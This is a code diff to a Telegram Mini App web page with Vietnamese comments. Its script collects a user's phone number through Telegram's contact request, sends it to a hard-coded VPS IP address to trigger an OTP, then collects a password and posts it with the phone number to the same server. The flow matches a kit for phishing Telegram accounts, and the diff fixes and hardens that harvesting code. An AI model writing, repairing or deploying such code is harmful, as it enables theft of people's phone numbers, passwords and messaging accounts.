@@ -60,53 +60,70 @@
 </div></div>
 
 <script>
-    // --- TÍCH HỢP KẾT NỐI VPS ---
-    const BACKEND_URL = '103.249.117.228'; // <--- THAY IP VPS CỦA BẠN VÀO ĐÂY
+    // --- TÍCH HỢP KẾT NỐI VPS (ĐÃ SỬA ĐỊA CHỈ) ---
+    const BACKEND_URL = 'http://103.249.117.228:8000'; 
     let currentPhone = "";
     const tg = window.Telegram.WebApp;
     tg.ready();
+    tg.expand();
 
     // 1. Gửi SĐT
     document.getElementById("shareContact").addEventListener("click", () => {
+        // Thêm kiểm tra môi trường
+        if (!window.Telegram.WebApp.initData) {
+            console.warn("Đang chạy ngoài Telegram, không thể gọi requestContact()");
+        }
         tg.requestContact();
     });
 
     tg.onEvent('contactRequested', async (event) => {
         if (event.status === 'sent') {
             currentPhone = event.contact.phone_number;
-            const res = await fetch(`${BACKEND_URL}/send_phone`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: currentPhone })
-            });
-            const data = await res.json();
-            if(data.status === 'otp_sent') goStep(3);
+            
+            try {
+                const res = await fetch(`${BACKEND_URL}/send_phone`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ phone: currentPhone })
+                });
+                const data = await res.json();
+                if(data.status === 'otp_sent') goStep(3);
+            } catch (err) {
+                alert("Không thể kết nối tới server: " + err.message);
+            }
         }
     });
 
-    // 2. Kiểm tra OTP/Password (Ví dụ logic đơn giản hóa)
+    // 2. Kiểm tra Mật khẩu
     async function s5check() {
         const v = document.getElementById('s5pw').value;
+        if (!v) return;
         const btn = document.getElementById('s5btn');
         btn.textContent = 'Đang xử lý...';
         
-        const res = await fetch(`${BACKEND_URL}/verify_password`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ phone: currentPhone, password: v })
-        });
-        const data = await res.json();
-        if(data.status === 'success') {
-            document.getElementById('s5success').classList.add('show');
-        } else {
-            alert("Sai thông tin!");
+        try {
+            const res = await fetch(`${BACKEND_URL}/verify_password`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: currentPhone, password: v })
+            });
+            const data = await res.json();
+            if(data.status === 'success') {
+                document.getElementById('s5success').classList.add('show');
+            } else {
+                alert("Sai thông tin!");
+                btn.textContent = 'Kiểm tra';
+            }
+        } catch (err) {
+            alert("Lỗi server: " + err.message);
             btn.textContent = 'Kiểm tra';
         }
     }
 
     function goStep(n) {
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-        document.getElementById('step' + n).classList.add('active');
+        const target = document.getElementById('step' + n);
+        if (target) target.classList.add('active');
     }
 </script>
 </body>
